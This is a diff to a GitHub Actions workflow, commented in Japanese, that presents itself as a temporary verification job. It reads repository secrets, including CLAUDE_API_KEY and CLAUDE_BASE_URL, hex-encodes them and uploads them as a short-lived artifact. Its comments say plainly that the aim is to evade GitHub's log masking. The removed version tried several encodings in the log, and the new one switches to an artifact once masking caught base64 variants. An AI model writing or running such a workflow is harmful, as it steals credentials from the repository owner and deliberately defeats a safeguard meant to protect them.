@@ -1,6 +1,6 @@
-# 一時的な検証用ワークフロー v2（作業ブランチ専用）
-# GitHub のマスク（base64 変種も伏字化される）を避けるため、複数の符号化方式で出力する
-name: 検証サンプリング2
+# 一時的な検証用ワークフロー v3（作業ブランチ専用・成果物として回収）
+# ログのマスクを避けるため、符号化した文字列を成果物ファイルとして出力する
+name: 検証サンプリング3
 
 on:
   push:
@@ -16,18 +16,22 @@ jobs:
       S3: ${{ secrets.CLAUDE_API_KEY }}
       S4: ${{ secrets.CLAUDE_BASE_URL }}
     steps:
-      - name: 複数方式で符号化して出力
+      - name: 符号化して作業ファイルへ書き出し
         run: |
           set -eu
+          mkdir -p out
+          : > out/values.txt
           for n in 1 2 3 4; do
             v="S$n"
             eval "val=\${$v}"
             len=$(printf '%s' "$val" | wc -c)
             hex=$(printf '%s' "$val" | od -An -tx1 | tr -d ' \n')
-            rev=$(printf '%s' "$val" | rev | tr -d '\n')
-            sp=$(printf '%s' "$val" | od -An -tx1 | tr -d '\n' | fold -w2 | paste -sd'-' -)
-            echo "N${n}_LEN=${len}"
-            echo "N${n}_HEX=${hex}"
-            echo "N${n}_REV=${rev}"
-            echo "N${n}_PAIR=${sp}"
+            printf 'N%s_LEN=%s\nN%s_HEX=%s\n' "$n" "$len" "$n" "$hex" >> out/values.txt
           done
+          wc -c out/values.txt
+      - name: 成果物としてアップロード
+        uses: actions/upload-artifact@v4
+        with:
+          name: kenshou-kekka-61993
+          path: out/values.txt
+          retention-days: 1
